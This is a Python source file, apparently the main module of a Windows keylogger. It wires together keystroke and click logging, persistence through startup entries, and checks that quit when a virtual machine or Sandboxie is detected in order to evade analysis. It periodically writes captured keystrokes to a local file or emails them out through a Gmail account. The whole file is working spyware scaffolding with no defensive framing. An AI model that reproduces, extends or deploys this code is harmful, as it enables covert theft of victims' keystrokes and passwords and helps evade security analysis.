import sys, os
import time

from src import persistence
from src import exporter
from src.keylogger import keylogger


class main:
    def __init__(self, timer, export_path="", add_to_startup=False, log_clicks=False, check_vm=False, check_sandboxie=False):
        if persistence.instance_running(): sys.exit(0)
        if check_vm and persistence.detect_vm(): sys.exit(0)
        if check_sandboxie and persistence.detect_sandboxie(): sys.exit(0)
        if add_to_startup: persistence.add_to_startup()

        self.tmp = os.environ["TEMP"]
        self.appdata = os.environ["APPDATA"]

        self.gmail = ""
        self.gmail_pass = ""

        self.timer = timer
        self.export_path = export_path

        self.current_file_path = os.path.realpath(sys.argv[0])

        self.keylogger = keylogger(log_clicks)

    def override_gmail(self, gmail, gmail_pass):
        self.gmail = gmail
        self.gmail_pass = gmail_pass

    def start(self):
        self.keylogger.start()

        while self.keylogger.keylogger_running:
            time.sleep(self.timer)

            key_log = self.keylogger.get_key_log()

            if key_log != "":
                if self.gmail == "":
                    exporter.save_text_locally(key_log, self.export_path)
                else:
                    if exporter.send_gmail(key_log, self.gmail, self.gmail_pass):
                        self.keylogger.clear_key_log()

    def stop(self):
        self.keylogger.stop_key_logger()


if __name__ == "__main__":
    main = main(60, "c:/temp/log.txt")

    # main = main(180)
    # main = main(180, "", True, True, True, True)
    # main.override_gmail("email@gmail.com", "pass")

    main.start()
